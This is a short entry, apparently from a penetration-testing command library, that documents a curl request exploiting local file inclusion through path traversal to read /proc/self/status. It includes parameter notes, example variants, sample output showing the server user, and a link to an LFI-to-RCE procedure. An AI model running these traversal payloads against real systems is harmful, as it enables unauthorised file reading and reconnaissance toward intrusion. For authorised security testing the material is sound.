---
id: a1c65e91-b063-463b-a403-8a4bfc59d9a4
name: curl-lfi-read-proc-self-status
type: command
executor: bash
data: >-
  curl "http://example.com/index.php?page=../../../../proc/self/status" -o
  proc_status.txt
output: null
created_at: '2023-04-06T03:55:58.711776+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - lfi
  - discovery
verified: true
validated: true
---

# curl-lfi-read-proc-self-status

## Command

```bash
curl "$_TARGET_URL?page=$_TRAVERSAL/proc/self/status" -o proc_status.txt
```

## Description

This command uses curl to exploit an LFI vulnerability by requesting /proc/self/status through path traversal, revealing the current process's user ID and other details. Use it early in LFI exploitation to understand the execution context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Base URL of the vulnerable endpoint (e.g., http://example.com/index.php) | Yes |
| $_TRAVERSAL | Path traversal string (e.g., ../../../../) adjusted for directory depth | Yes |
| -o | Output file flag to save response | No |

## Examples

### Basic Usage

```bash
curl "http://target.com/vuln.php?page=../../../proc/self/status" -o status.txt
```

### With Silent Mode

```bash
curl -s "http://target.com/vuln.php?page=../../../../proc/self/status" > status.txt
```

## Expected Output

Process information text:

Name:   php
State:  S (sleeping)
Tgid:   1234
Uid:    33 33 33 33
Gid:    33 33 33 33

Look for Uid/Gid to identify the user (e.g., 33=www-data).

## Related

- [[procedures/Linux-LFI-to-RCE-via-Credentials-Extraction]]
